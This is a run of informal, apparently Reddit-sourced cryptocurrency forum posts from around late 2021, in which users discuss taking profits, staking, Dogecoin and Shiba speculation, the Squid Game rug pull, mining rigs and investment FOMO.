Excited for my first moons! Ive been a long lurker here and thought about investing in them, but realized its better to earn them instead of buying them (I still bought some). In my opinion, they have huge potential!

So I got into crypto in January, mainly
holding ethereum. I had a dollar figure in mind that I'd take out %50 for profits. It's nothing astronomical, about  a years worth of Savings but now that I've hit that number I'm having trouble convincing myself to take profits. Once I take it out what do I do leave it in a bank to earn 0.000005% interest? 

I have the luxury that I can pay all my bills, rent, food put some aside for an emergency fund and then everything else goes into crypto and some stocks so if I lose it all I'll still be able to continue living my life as I do now. 

It feels like such a strange time to take profits when there's new changes coming and so much hype around crypto but I know everyone says to take profits and don't get greedy don't invest more than you can afford to lose. Do  I have my head in the clouds? Not enough PTSD from the last major crash? Too dedicated to Diamond handing?  Guess I need someone to slap some sense into me.

One of the unfortunate stories of past few days has been the rug pull by Squid Game developers. It was horrible and shameful for those (including me) who genuinely want to see this world becoming more decentralized with advances in Blockchain/Crypto. These incidents weaken common confidence and give skeptics one more example to quote.

As I was reading the news, as much as I felt horrible for all the people who invested in the Squid Game coin, something really stood out to me. In a similar news in 2008, I read about "Bankers" stealing hundred of billions of dollars from individuals as well as institutional investors (through bad mortgage loans) that brought the global financial system to a halt. It crashed the markets and economies and became the "great recession". In 2021, a much much smaller amount was stolen from individuals (and may be institutional) investors but this time, it was stolen by "Developers". Oh yes, **"Developers"**!! Times are changing and it's becoming more and more evident that it will be the developers who will lead the architecting of the new decentralized world. 

With great power comes the greater responsibility. I hope building the guardrails to protect the system as we build the new system becomes a mainstream topic, not an afterthought of bad events. Nonetheless, even though a horrible event, it's interesting to realize the shifts in the power and how critical the Developers will be in leading the transition to the decentralized world. Let's spread light, hope and goodness, not the fraud and evil.

Godspeed!

I read a lot on here about "don't tell people you invest in crypto". I get why some people want to keep that quiet. But for me talking about it with people is great for getting the message out! 

At my work (retail wage slave) a lot of us are into crypto and its a common discussion topic. People talking about what coins they're excited for, people starting out on mining, staking etc. 

Just the other day I had a work colleauge reach out to me asking about crypto. They're interested in getting into it and their first thought was to ask me! 

I explained the basics, where to buy, how to buy and market movements. One thing I never do is say what coins to invest in (This is not Financial Advice). Also the importance of doing your own research! 

I'm going to have a sit down over coffee and with them go over everything in detail and explain anything they don't get. I'm excited! This is the start of the shift to the mainstream we need.

Considering the astronomical gains that people have had from all sorts of weird and wonderful meme coins.  Tax forms in the next couple of years are gonna get silly.

Profits made from all sorts of crazy meme and shit coins will inevitably be declared on tax forms and therefore land on the laps of tax people all around the world.

Can you just imagine as a worker in the tax office when you suddenly get a $2,700,000 tax declaration from a cryptocurrency called ElonWongle?

Just imagine the confusion.

As the bullrun continues, the tax offices will be under great pressure to deal with tax declarations from  early adopters of MoonFace, SafeHead, Very Small Floki, ShibPigFinance and many other absolutely shit cryptos which still made people insane profits.

Governments all around the world are soon going to be rolling in extra money from cryptos like SafeWaffle and BitShit that they won't know what the hell is going on or where the money is coming from!

Hey guysIm completely thinking about changing my career and going to school (preferably online) to become a blockchain developer or engineer. I graduated with a B.S. in Civil Engineering but I want to possibly change my career. Can anyone give any advice and potentially and suggestions as to what school I should join? Preferably online, I live in SouthEastern PA. I know this is going to be a huge change in my life but Im unhappy with my career now and with the metaverse coming out this is only a start to what is to come in our life. Im looking for a change and would appreciate any advice on what school I should go with. Thanks!

Hi everyone,

&amp;#x200B;

I wanted to ask for some help and advice. My team and I started a crypto project which allows people to mine tokens while using their navigation app.

&amp;#x200B;

The idea is that advertisers buy ads in the form of NFTs which will be located on the road. The promotional NFTs which could be discount vouchers for your local burger place will be automatically sent to your wallet. This opens a whole new door to advertising.

Because it's mandatory for advertisers to buy the token advertise, the price of the token will go up. Which goes directly to the miners.

We believe if you build the platform, you should get the rewards. Build by the community, for the community. 

&amp;#x200B;

We the token, miner blueprint, website, and everything is ready, we are now looking for the first community to join us to improve the idea and build this together. 

&amp;#x200B;

I didn't post the website here to avoid not being able to post but I will leave it in a comment. 

&amp;#x200B;

Thank you so much for your help and please leave your thoughts.

I know we all want to be picking Lamborghini colors in like a year, personally Im prone to picking the orange one. But whats your realistic goal with investing in crypto?
My plan is to leave my country in 3,5 years (when I finish my PhD). Im sick of having such a poor quality of life in a third world country, and to be honest I think I deserve more. For that to become reality, I need a lot of money and thats why Im investing in crypto. Hope that in 3,5 years I can tell yall I made it, but Im interested in your reasons too.

hey lads, 

wondering if anybody could;

1. point me towards some good info or give me info about accepting crypto (btc, eth, ltc, etc.) for payments through my business website.
2. point me towards info or give info on how i would easily convert said crypto payments to fiat easily if need be (im thinking that some payments will be kept as crypto and some will be converted to fiat as soon as the payment is recieved so im just wondering about the most efficient way to do this and if theres a service that will do this automatically for me?0

thanks in advance!

I've just gotten into crypto, there's so much to learn and I'm just going over stuff constantly trying to soak in everything I can, I've quit on stuff but I'm going to be sticking to this. I just wanted to know, what do I need to start investing, can I do everything off coinbase or is this there another app I need? I heard some stuff about a wallet? Do we need something separate for that?

I'm going to invest my first 10 soon to just play around with and learn the system, where would you recommend I put my first 10?

The crypto story. 

I went from having a doge to adopting a bunch of dogs. Getting a farm and inviting Alice to help me build a portfolio. I just purchase some bananas, but these are the tiny ones,  the ones that are like 1inch and honestly  looking to into the future my farm might turn into a zoo. Just imagine having a my zoo and looking up to the LUNA and into the cosmos. As soon the SOL comes out Im goin out to plant some clovers. Maybe Alice can help me with that too while the Internet Computer in my distric0x is not doing so well. Im not here asking for an advice, I already got plenty of those and mostly all of them say to hire an alchemy but before I do that I would need to have my pack of doges find some lead or copper on decentraland.

I just realized how far-reaching Canvas scope truly was when it raised USD 200 million in its recent USD 40 BILLION valuation. I honestly couldnt believe everyones free image editor could get this huge, and I think its only a matter of time before it gets into crypto. And I also think this is something we need to pay attention to.

Remember, we can thank Canva for a lot of team collaborations with its live editor, so we know community growth is one of Canvas strongest suits. Considering its potential to create a platform that prioritizes community participation, I [read](https://financefeeds.com/canva-hottest-unicorn-grow-even-nfts/) that Canva may as well integrate NFT creation and marketplaces (platforms like Raiinmaker or Envoy) if it decides to push into crypto. And seeing how popular NFTs are nowadays, its not surprising if Canva is one of the first mainstream graphic art companies to start NFT integrations. 

Of course, its how Canva can do it (if it decides to) that were not entirely sure of. But if Canva at some point plans on releasing a token or a blockchain integration, Id definitely stake on that.

I want to get your thoughts though. Does the idea make sense? (I hope I used the right tag!)

I always didn't like the tokenomics of Algo as when it was released it had a huge price correction from 2$ ATH and most of founders have kept a daily sell order to make sure each day the certain amount of tokens are being sold in the open market. 
There was a lot of buzz going around people whether this would be wise choice to invest and I was among them.
But then I really thought of giving Algo another chance and Adios...now they've just completed the governance voting and with the projects piled up with the Algo network I'd say this has the potential to be the Top 5 cryptos in terms of Mcap.
Now this is for me , did you have the Crypto that you hated the most thinking I'd never buy this but then later  changed your mind.

Holding 50% BTC, 25% ETH, 25% mid/small cap.

Hodling bitcoin forever. It has a capped supply w/ reduced mining rates. A lot of it is parked. The new bitcoin ETFs that are coming are going to eat even more supply. Banks, countries, pensions, etc want in. That's just upward pressure on price. I still expect volatility of course but given enough time I don't know why I'd ever sell.

As for ETH I plan on holding forever as well. Layer 1 network protocols will be competing with each other over transaction speed.. energy usage.. etc. but ultimately the apps and market built on the network will become the value. ETH has such a huge gap against other worthy contenders like Cardano Solana Avalanche etc that I will keep ETH because its marketplace is dominant.

As for the other cryptos I will rebalance smaller positions into various projects as advances are made. Not really trying to hodl those as winners and losers will be decided, but it's a very interesting space between L1 and L2 protocols, definance, NFT platforms, gaming tokens, etc.

I'm interested to see how the community feels about this and what directions you are taking?

According to CEO Jesse Powell, the Kraken crypto exchange wants to enter the traditional financial sector and is adding the Shiba Inu token to its portfolio in advance.  

While more and more traditional financial institutions are moving in the crypto sector, there are also quite the opposite tendencies. According to CEO Jesse Powell, the crypto exchange Kraken is planning to enter traditional banking services. During a recent interview on CNBC, Powell said the company is well on its way to offering long-term stock trading and even "small loans." 

However, he added that traditional finance is not a priority for the crypto trading platform.   Kraken app launched in the United States in June Kraken was founded in 2011 and is still one of the largest crypto exchanges around. The trading platform also prepares the listing on the stock exchange, but makes the date dependent on a valuation of over 10 billion US dollars. It was only this June that Powell's company launched its trading app in the United States. 

Europeans have been able to access the offer since the beginning of the year. The Exchange, headquartered in San Francisco, also announced its support for the memecoin Shiba Inu on Twitter. In doing so, it stands up to its big competitors such as Coinbase.

So, I've talked a lot about this with various people, but I'm curious what you all think.

Traditionally, politicians have been necessary representatives for portions of a nation because it was impractical to hold a nationwide vote on every issue. Travel time, time away from working and the cost of running constant elections were all big factors on why it was just more efficient to elect someone to do the voting for you and hope they have the integrity to represent your interests. Given events in recent years and historical evidence, many politicians cannot be trusted to avoid corruption or make decisions in the best interests of the people and most people don't have a say in it other than to say, "we'll just have to vote someone in better next time." But is that really good enough for the future of how countries operate? How are we supposed to keep legislation up to speed with the rate that technology and other sectors are growing?

These are the kinds of questions I asked myself and others. We live in an age of instant information and direct communication where it's possible to move data at lightning speeds globally. So, why exactly should we hold on to the traditional setup of trusting these politicians to represent people's interests when, in many cases, they clearly cannot be trusted to do so. If Bitcoin can be a trustless network that operates without fail and is totally transparent, why can't we have the same thing for government?

I imagined a scenario in which a crypto exists that allows for single account usage using some kind of KYC (more like Know your Citizen rather than Customer). A person, using SSN (or whatever appropriate identifier) would be able to access the network using this account and would be able to vote directly on issues being debated. There would have to be some kind of app that would provide a list of issues available to vote on (I was thinking there could be User submitted proposals similar to how we already do on this subreddit) and when the user votes, they would receive confirmation via the chain that their "transaction" was complete. Not only could you use it to vote on issues, but you could also pay the citizens for taking the time to vote using the token on that blockchain. This would encourage those who might not care about policy making to participate. 

I'm not saying this is better than what we have now, but I'm also not not saying that. I'm just curious what you guys think some of the bigger issues would be with a system like this and whether or not it was feasible or needed. What are the possibilities? What do you think?

I work with some immigrants from all over the world and they said they're really interested in buying crypto and I would really like to put them on and show them some cool projects and shit but every exchange requires a Social security number which they do not have. How can they purchase crypto? It would benefit them a lot since they have family and they really want to send money back home to their loved ones without the outrageous fees from western union and shit. Are there any exchange like coinbase or crypto.com where they can easily buy, sell and send crypto?

I bought some TRAC today and was excited it was going up. Unfortunately coinbase pulled their shady shit and wouldnt let me convert to BTC or anything. I was always getting the to ensure youre getting a fair price, please break this transaction into smaller amounts message. Except, no matter how small I made the amounts it still wouldnt go through. The screenshot above it shows how the iOS app with sometimes let me complete a transaction, but then I would check the history and coin base and always return the amount. Basically, I couldnt extract any profits! What bullshit!!! Grrr!!!

Id always defended Coinbase before for being easy to use and those free rewards. I thinks this does it for me. Im getting out of coinbase, which Ive been using since 2017. Im done giving those fuckers my money! Im not sure if I have enough crypto for it to make sense, but Im getting a ledger hardwallet mainly out of spite.

So I own some crypto, mostly bitcoin, and have recently started seeing the craze around NFT's. To be clear, I don't go into something unless I have some sort of semblance of what I'm doing, so I'm not asking for a get quick rich way to use NFT's. Just trying to get educated.

But my little sister is struggling to get her art out there, and knowing a little bit about NFT's, I thought it could be a cool option for her to get into it and make money off of something that she definitely wouldn't be able to otherwise. I know there are marketplaces that does the heavy lifting for you in creating and signing the NFT, but how is money to be made from the average joe/jane getting their art out there?

The number of people talking about meme coins or Shit coins has only been on rise. Now I'm not against investing in These coin it's your money your Crypto. But what I couldn't understand is the fact that people are telling BTC and ETH are too late to be entered.

The average returns from an index gives you 7% whereas when you take a look into the Top cryptos like the BTC which has run up from 14K$ to 67K$ which is more than 300% returns and ETH has rallied from 400$ to 4400$ which makes a 10X or 1000% returns for your investment.

No Alts no meme coins this is just by investing in the best Crypto out there. The best method that's followed by many including me is the DCA during bear market and DCA out during ATH or somewhere near. Please don't get into the habit of searching for 100x everytime you can do that but it's a hard chance to get one. This is why if anyone would ask me I'd say forget about all other shit just concentrate on the these two but some how it's being misjudged by people.

I'm not against memecoins nor do I hold any it's your money all I can say is a opinion but it's ultimately you way of investing and always DYOR before getting into them

Get all angry and mad when regulations on crypto start being talked about but then a scam or two suddenly you guys cant stop talking about how messed up it is. Do you want to put more fear and talk into crypto so regulations are put in place just to whine more about it. Stupid people get scammed all the time just dont be stupid, stupid .

The last couple of months I have been more and more thinking about my exit strategy not because I want to leave the crypto space but because having a strategy is the 101 of Crypto.   


I am not the trade kind of person so I always preferred the slow and steady DCA and hold kind of way.  
And so far it worked out pretty well. During this crazy rush I managed to change up my strategy and sold some of my major holdings for profit in case it falls back down. I also started using passive Income or staking services like Block Fi and Celsius and staked there a part of my holdings to acquire even more crypto.  


So and now to my endgame strategy,

For the reason that I am still pretty young I plan to gather more crypto for at least the next 5-6 years. After this time period I want to use the acquired money from crypto and my job to buy a house with some land. 

I pretty much calculated how much I need to save and how much I can use to buy crypto with. And depending on the crypto market I can reach my goal in 5-6 years or in about 10+ years if for some reason all the crypto money is worthless which is pretty unlikely I hope.   


Another thing you and me need to consider is the taxes you will have to pay on your crypto holdings which is different from country to country. I just need to stop selling/swaping for at least a year and I fix the problem, but this might change due to always changing laws so we gotta keep that in mind.

So to conclude:

* Buy slowly in 
* Acquire more and more crypto (use lending and staking and APY earning cryptos like Algo) 
* Sell some Profits, but do it slowly as well (start with selling 5% at a time) 
* Buy back in at lower Prices (more coins is the focus right now)
* Repeat till it's time to hold for a year without any swap/trade etc. 
* Exit out 100% and live a happy live 
* S~~ell your newly acquired house for crypto to join the game again~~  


In times where the prices are high and the market is greedy, don't forget to be smart and strategic about your decisions, remember to take profits and always **have a plan**. 

And the most important thing you have to forge your own **personal** plan. I can give you tips but after all you are the reason for your own success. 

&amp;#x200B;

Much love,

Any success? Theyve caught my interest in the past week. I ran a spot grid bot on Rfox. It made me 100 dollars in just a bit over 24 hours. However I would have made more just buying and and holding. So in that instance it really didnt work so well. Im also looking at the smart rebalance bot. Some people have insane daily %. When i look at their setup, its nothing special. Any ideas what theyre doing? Anyone have a lot of success and can teach me?

Also any insight on to why there is a huge variety in the minimum usdt u must invest into the bot depending on the token

I started my crypto portfolio last month and I put a few dollars in it since then. I havent made much back, but Im only a month into such a long term commitment. Ive been learning more about staking; Im currently staking some ALGO at the moment but thats all I have. I wanted to know what the best wallet or exchange is for staking multiple coins, whether its BTC and ETH or other alt coins like SOL or DOT. Im using a wallet right now that only has a limited number of options when it comes to staking. I figured I get a wallet that allows for more options. I know Celsius has a couple coins with more than 8% APY and Gemini has a larger variety of coins at various interests. 

And if there was a way that you could stake moons too, that would be awesome because moons are the future.

Very new to the community and super curious about how you all first found out about crypto, and about the circumstances and stories about what motivated you to try and buy it for the first time? So feel free to give me the whole spiel because I'm interested!

Other background? If you were early, how did you even have the technical knowledge to buy in? If you were late, what finally gave you the courage to take the leap? How much did you buy? Was the amount that you spent a lot or little to you at the time? What crypto was it? What compelled you to buy it? Still have it? Were you scared and anxious? Did you tell anyone? What did they think of your gamble? If you lost money, why did you lose it? If you made money, what did you do with your earnings?

Thanks to this great community, and really looking forward to hearing any stories people want to share!

As mentioned in the title, what do you guy/gals think will happen to ETC price wise once ETH 2.0 is fully phased in. 

Sorry if this has been discussed already. I have bought/sold ETH, BTC, shiba and doge but havent had the mental fortitude to just leave it alone (backfired ofcourse). Hoping to finally just start investing and stop pretending to be a day trader. Just hoping for some help from the community before doing so. I know now the get rich quick aspect of crypto is a bit like gambling. It definitely can happen, but most of the time youll be left wishing you never did it. Good things take time!

Thanks in advance!

As experienced crypto investors you all are you have spent countless hours shitposting here so let's give this a try. Tell me your favorite one liner related to crypto.. 
It can be a common line that you just love and you feel it suits you. 

It can be hurtful ones like "This is alt season but not your alt season!"

It can be serious ones like "Bitcoin is king".

It can be delusional ones like "Shiba will reach $1.

It can be funny pervert ones  like "I love green dildos"!

It can be pessimistic ones like  "Crypto is dead" if you wanna get downvoted.

Use your imagination. Amaze your fellow multimillionaires!

I came across an article from the front page yesterday where people were discussing cryptocurrency and the rugpull of all rugpulls that was Squid Game. One of the top comments was from a user BLASTING bitcoin and cryptocurrency in general and how nobody will ever use BTC as a form of currency. I don't 100% know the rules around tagging users from different subreddits so I will just paraphrase here (I can link the post if required):

"With so much volatility, why would you ever want to use it (BTC) as a currency? And if it's not currency, why does it have any value? Is it even an investment at that point ? I keep reading all these BTC bros talk about how it's decentralized and that's the value, but currencies are backed the sovereign nations printing them and in turn backed the economy."

Now there's obviously a few arguments to unpack here and they are making a few bold statements in a brief paragraph but it was nearly a top comment so obviously, people outside of the cryptosphere (aka here and other crypto subreddits) agree with this person. I obviously disagree with several statements made here, mainly that of BTC not being an investment and where BTC derives its value from, but does this person raise any valid arguments or are they totally out to lunch? And if so, what needs to happen so that this train of thought doesn't dominate the mainstream population and mass adoption can occur? 

Also, happy moon day everyone!

So, a few days ago I transferred about $200 worth of shiba into my Coinbase wallet app. In the hopes of then changing it to ELON. When I try to do this it says that I need to pay eth to do this and that its like $700 in fees. Im so confused. Ideally Id just like to transfer it back to my Coinbase app and cash it out but for some reason I cant. Can anybody please give me some advice on how to sort this out. Im quite new to all of this. Ive only ever really been buying and selling on the Coinbase app. Totally new to the Coinbase wallet app. Thanks in advance

I posed the question because we all know there's a lot of fraud going on in the NFT space.  Though the street crypto space is certainly not much different I think the nft stuff has brought a lot of awareness from people who were otherwise not interested due to celebrity endorsements and extensive media coverage.

Has anyone here experienced any rug pulls with NFT's yet? If so I'd like to hear about it what happened in your case.

I'm just legitimately curious about how people feel about this. Do you think the broad appeal of NFTs will help or hurt crypto in general?

The whole topic is just fascinating. I think we're living in an exciting time because all of this is really starting to heat up and it's going to change our world forever.

Contrary to popular belief, cryptocurrencies are not stored in crypto wallets. The only things that are stored there are the private and public keys. The funds are recorded on the blockchain and can only be accessed by someone with the correct public and private key.

Public keys are like bank account numbers, which are shared with people in order to receive transfers. Private keys are like your debit card pin code, allowing you to get into the account and make transactions. Without these keys, there is no way any transaction can be carried out.

Also, if youre not HODLing your coins in your wallet, but maybe you have them at Binance, Coinbase or any other exchange, youre not the owner of the coin, youre just someone elses code in their spreadsheet.

Understandable, nobody wants to pay fees for transfer, but better to be safe than sorry.

Hi hope everyone is well

Am very new and attempted my first stacking/steaking today but am confused I understand ALGO can be staked just by holding so I thought that would be a good start trust wallet had a good rate 4.9% 

So i send off 

44.112933 to trust wallet for 4.9%

The fee was 0.002

But available and stacking is 
44.024725 which has increased it was a little lower 

Am I being silly here but why is it lower ? Apologies if am being extremely dumb here 

I feel this is like stacking high get less 

Thanks

Yesterday, seeing the LRC token skyrocket, I FOMO'd in.

I bought a small(ish) hold with my ETH at the price equivalent of 0.70 $; after a small pump, however, the token started dropping. Disappointed, I set a sell order around 0.76$, a meager gain, and went on with my day. When I checked back after several hours and saw my order fulfilled, I breathed a sigh of relief.

Only, the coin wasn't dropping - it was correcting. It bounced back up and kept growing! At present it's hovering around 1.45 $, more than double the price I bought at.

I totally missed out... but oddly, I'm ok with that! I thought I'd be crushed by a gut-wrenching guilt and I'd spend many sleepless nights pondering over the missed gains; instead, I only feel slightly bummed. I still completed a successful trade (however small) and I'll still have plenty of chances to catch a rocket to the moon. Besides, I'd have probably sold before even low orbit.

&amp;#x200B;

So... lesson learned: missing out doesn't feel as bad as the Fear Of Missing Out suggests. Mulling over missed profits is like watching a lottery ticket winner and saying "oh, how I wish I did what he did, and bought that exact lottery ticket!". Just set some goals that you know will make you happy, and be happy when you reach them!

I remember the run-up in 2017 to all-time high prices and talking about it with my brother-in-law. I didnt have any money to put in at the time, but blockchain tech plus the thought of finance going all digital fascinated me. (Side note: I asked him at the time if he was buying BTC? Heck no he replied, that ship has sailed, too expensive. It was about 15K at the time. Life-lesson, it always feels too late!)

I began reading and researching BTC and crypto as a whole in 2018/2019. Then, one faitful day in March 2020 I jumped on it, buying my first partial BTC, ETH, and LTC.

Ive been accumulating (very slowly) ever since. Crypto is my side hobby. My wife rolls her eyes when someone asks a crypto question, because she knows what the topic will be for the next twenty minutes.

This brings me to the crux of this post:
Im at a place in life where I am considering changing occupations. Ive always wanted to be my own boss. I know where finance, decentralization, FIAT, government money printing is heading. Im trying to figure out if I can use this knowledge Ive accumulated over the years to start a business in the crypto universe. 

Ive considered:
-Informational website, something for people like my mom to start on. Ex. What is Bitcoin?
-Podcast?
-Mining? (Considered it strongly, just couldnt bring myself to sell any holdings to pull the trigger)
-etc.

Feels like these are already done to death though. (That ship has sailed theory? Maybe)

So what options would you jump into if you were going all-in with crypto as your business, or even side-hustle?

Genuinely curious to your thoughts.

Thanks all!

Throwaway, obviously.

I have a portfolio of nearly $3 million and it earns almost $300 per day from staking, lending, or other. I have been involved in cryptocurrency in some form or another for nearly nine years. I am not a techy person; I saw bitcoin for what it was early on and, although I have sold some in the past to finance big purchases, have held most of my stack through the 2013 and 2017 bull runs. I haven't quit my job, I don't own a lambo, and it's been at least 5 years since I mined DOGE (I also sold it long before the meteoric rise). I lost .3 BTC on the Silk Road when it was raided, but never had any coins on Mt. Gox.

I am currently in 12 coins, and have exited from 33 others. 

Ask me anything.

Hey! I have recently started looking into crypto, originally thinking that it could make me some quick money, but after some research it seems best to invest for the long term.

I have downloaded coinbase, exodus and tradeviewer. 

I put 10 on coinbase just to have a play around, did their learn to earn things and ended with around 20. 

I tried doing some analysis with tradeviewer and invested in LTC, but I don't think I'm quite ready for that yet, so I dumped it into bitcoin and etherium.

My plan now is to wait for a dip in BTC/ETH each week and put 15 in each, whilst educating myself a bit more, then maybe start looking into other cryptos.

Can anyone give me any pointers, or advice please? 

Also what is the difference between coinbase and CB Pro?

Hey all, this is my fourth-ish week into crypto and I've decided to start staking some coins to make a bit of passive income. I chose Harmony One to start with and will probably do some ALGO next, but I was looking at the elected validator list on the blits app and saw the usual ~10% apr listings but then saw a 77%? Under their last performance it said 52%. The guy has just shy of 4m staked and has 99.93% uptime, which all looks normal.

My knowledge of staking is pretty limited as I work 45+ hour weeks so all my free time has been going into researching the coins themselves. Is this legit? Is there any catch that I'm not seeing? Or is this just a new validator thing and he'll change his rate once he has more people delegating him ONE?

Cheers

TL:DR, Which crypto would you buy for $786.18 in 2021?

I stumbled on this sub when BTC was $40 000 and going down. 

I am a father of one, and I do not have disposable income, so getting into and buying the first $200 of ADA was extremely hard. I doubted if I had gambled the money away and would never see it again... 

Since then, I have invested another $1000.  I have spent around $1213.82 on several cryptos, and my current market value for this portfolio is $1923.  I aim to invest another $786.18 by the end of 2021. 

Currently, I hold BTC, ETH, AMP, XLM, DOT, ADA, KAVA, and SHIB ($10 worth).

That could be a laughing matter for some, but for me, this is the most money I have ever invested in my life. 

I wanted to thank the active members of this sub who are helping others join in crypto. 

If you had to invest $786.18 by the end of this year, what would you buy?

So I had a family member to whom few thousand $ has to be sent and from my country it would cost a hell lot of money just in currency exchange plus when I'm sending from here it'll take days to receive it from the other end.

I seriously had a thought of asking him if he would accept Crypto as a payment but there are still people out there who really think this is paper money or something they would never compare with a dollar.

The money was an urgent requirement but now without a choice he has to wait for few days but if I had sent him through a wallet it would cost the same fees but money would be sent instantly which was the reason he asked for.

Crypto can really change the world but it is in the hands of the people who use them. It's really frustrating to see people don't accept technology which would ease their life in various ways but yet no one would ever change for. If it were me I'd have even asked for XLM or Tron and then convert them into the currency but hey this just shows were still early in the Crypto space. 

What would guys done if it were you? Would you have asked for BTC or any other crypto if there was a need?

Pretty much per the title above

See link
https://nitter.net/elonmusk/status/1455634905870786564#m

I guess this indicates the coin will explode now, with anyone's guess what happens there.

For anyone wanting to do research, see the BSC scan link:
https://bscscan.com/token/0x2b3f34e9d4b127797ce6244ea341a83733ddd6e4

Be warned that this is a meme coin, buy at your own risk. I have no idea if this could also be a rug pull or other trap, so not financial advise

I really hope this is enough words for automod!

I'll try to keep this short but can answer questions in the comments.

1. 1.14.5 which reduces transaction fees and increases transaction efficiency [looks like it's about to be released this weekend.](https://www.reddit.com/r/dogecoin/comments/qkfi1b/dogecoin_daily_discussion_1st_november/hiyjmlo/?utm_source=share&amp;utm_medium=ios_app&amp;utm_name=iossmf&amp;context=3) The user stating a timeline giving a possible weekend estimate is one of the four core devs for DOGE. 
2. Just a few days ago the #1 Doge wallet woke up after 6+ months and started sending it's 36.7B doge around - this wallet is now sitting at 4.1B Doge. - [5 out of the top 15 wallets are linked to this whale](https://bitinfocharts.com/dogecoin/wallet/3334959) with a combined Doge supply of 30% between them. This is thought to be RH moving money (from cold storage to hot storage) as it prepares for crypto wallets in the next few days/weeks. [Everything I've collected on this whale here](https://np.reddit.com/r/dogecoin/comments/qj7rrx/we_did_it_we_got_the_attention_of_billym2k_who/). 

This one is probably the biggest especially if 30%+ of Doge is currently locked behind RH and can't be used for adoption - it also helps with Doge's lopsided distribution that gets used to FUD Doge about "Rugpulls". I would say it's about the closest we can get to a confirmation that this whale is RH other than RH confirming it themselves.

If you're on the fence about this one watch the top wallets linked inside over the coming days; and see if they start distributing Doge around in smaller increments. That would almost indisputably guarantee it's RH preparing for wallet rollout.

\----------------------------------

3. WildCard - but worth consideration. [Elon has pumped the changes going into effect with 1.14.5 over 9 times since May](https://np.reddit.com/r/dogecoin/comments/q25x3q/elon_has_pumped_the_changes_going_into_effect/). (note he has pumped the changes a few more time since that post was made). Additionally 6 days ago an article came out that [Tesla was considering transacting in cryptocurrencies](https://news.bitcoin.com/tesla-informs-sec-it-may-restart-transacting-in-cryptocurrencies/). keyword plural and he has previously teased accepting Doge. The two pieces above both seem like they would be important things for Tesla to consider before accepting Doge.

\----------------------------------

In any case even without the third - the pieces are in place for Doge to see some Large Green Candles soon and with the third Doge would see a hyperbolic rise. Nobody can guarantee anything in crypto. But if I had to - I'd say it it's very likely that. 

There are links inside of links inside of links, for you to start doing your own research on the topic - let me know if you have any questions in the comments.

\----------------------------------

Please note there are other potential reasons for Doge to be solid longterm but the things listed above are near future implications.

Sometimes you Apes just make everything a little bit better and I wanted to take this opportunity to see how much I absolutely appreciate this community even though as you all know we have to sift through a lot of crap but every now and then theres a diamond in the rough and it sure helped today and also very much helps last week before shib went nuts ! Ive been gambling with a few shit coins for a while now so man it feels nice to get some big wins in! I didnt believe this November would be as bullish as projected but so far so damn good!

Hi, 

I have been following this subreddit for a long time and have seen the various posts of massive gains or some shitcoin that has been shilled to people here. 

However I have not really seen posts where people explained the next gem, great project to the whole community? 

Why is that? Why are people not trying to make more posts about the next project / coin / token? 

I for one am trying to find a great source and hoped for this subreddit but somehow its not there. 

Am I overseeing something?

Hey guys, Im looking to mine crypto to build up a passive income stream as well as hold for the long term - but I dont have the finances to get a rig thatll actually mine more than pennies, but after doing some research and looking at different options, I could get a high end rig that can make around $7 - $8 a day profit then I could finance something then pay it off with the  crypto I mined and then keep the profits? Is this a good idea and if so, what rig would be best suited? I really want to be in on crypto in some capacity and believe its the future but its not something Im able to just invest thousands in.

Thanks everyone

 I took an export of data from [https://stellar.expert/explorer/public/asset](https://stellar.expert/explorer/public/asset).

Filtered to show the top 100 assets sorted by number of holders. Tokens without a USD price were removed.

The Supply was then multiplied by the USD price to get Market Cap. The total of all token market caps was $209,254,173,249.36.

In my opinion, this is a ridiculous way to represent how much money is on the network.

Here is the link to see the data. Feel free to check my work. [https://docs.google.com/spreadsheets/d/1Qs5NXI38qA7bJ6R13PbIoDh-5Xu1n9PjFOVXvtx9V7E/edit?usp=sharing](https://docs.google.com/spreadsheets/d/1Qs5NXI38qA7bJ6R13PbIoDh-5Xu1n9PjFOVXvtx9V7E/edit?usp=sharing)

Hello fellow crypto holders,

How do you think the parachains will affect the price of dot? I know the reddit sub is not the place to ask and I'm doing my own research but I was curious to know what other people think on this matter.   
The way I see it many dots will be locked in for the crowdloans, therefore the demand for the dot will increase. It hard to predict how many people will join in this 92 weeks locked period, for me personally its too much, some people might think it will be worth the wait, I guess I'm not that patient yet. I currently hold and stake my dot, like the project so far. 

Let me know what you think in general, correct me if I'm wrong.. all opinions on the matter are welcome, cheers!

My head is spinning. I'm tired and overstimulated. I wake up and before I even check what time it is I check to see the price of SHIB. Hell, my dreams are just red and green graphs and candlesticks and percentages and the face of the guy from the coin bureau and Japanese dogs frantically flashing nonstop. 

It's a nightmare. A week ago I had no idea or interest in any of this and now I'm checking the prices of all the coins I invested in. I have no idea what I'm doing. I have no idea why I bought a bunch of unknown meme coins. I don't know a thing about economics or finance or any of this fancy tech. I know how a blockchain works but I have no idea why some coins are good and why some coins aren't that good and why are their prices going up or down. I'm just a monkey that learned about gambling. I give 1 banana, maybe I get 2 banana back. That's all it is to me. 

The FOMO is immense and this whole thing is highly addicting. I haven't put more money that I can afford to lose and I actually made a small profit but I feel like I'm going crazy. I'm high on hopium that one of the coins I invested in blows up like Solana or something but I have no idea.

I just want to go outside and touch some grass. I want to watch a movie without checking graphs and prices. I want to lift weights without reading posts on various forums speculating which coin will blow up next in-between sets. No wonder I'm too dumb to amount to anything in real life

How do I let this go? Please help

I'm looking into buying a miner hosted with Compass Mining, but I'm not completely sold on the idea that they're a real company and not a scam. I have not found many detailed reviews, and the less detailed positive reviews seem like they could be fake. The only negative reviews I'm seeing are people saying it took longer than expected to bring the miner online after paying.

I haven't really seen anyone explicitly saying they were scammed, though, which is why I'm still hopeful.

I have had a few of my questions answered by their customer support already, but the one thing they were unable to answer was how they actually make money. I suppose it's in the hardware resell and electricity charges, but their support rep said they could not tell me.

I am looking into cryptocurrency mining and I found a website called asicminervalue.com [The miner Im looking at](https://www.asicminervalue.com/miners/bitmain/antminer-e9-3gh)

The website estimates a profit of $89,520 per year with that miner (antminer e9 3gh). I found the miner for sale for $12,000 NZD. This all just seems to good to be true!

Does anybody have any experience with these miners and if you do:

Are the profit margins accurate? 
($89,520 per year)

If not what is a more accurate estimation of profits a year?

I was thinking of buying one of them and sending it to a data center and not have to work another day of my life.
This post has to be at least 500 words long so Im going to keep on writing stuff to fill in the words. If this is true Im going to set up a warehouse full of these miners and buy shit tons of solar panels and I can do everything. This is extremely broken way of getting money fast, like a get rich quick method. And if this is true why isnt everybody already doing this?

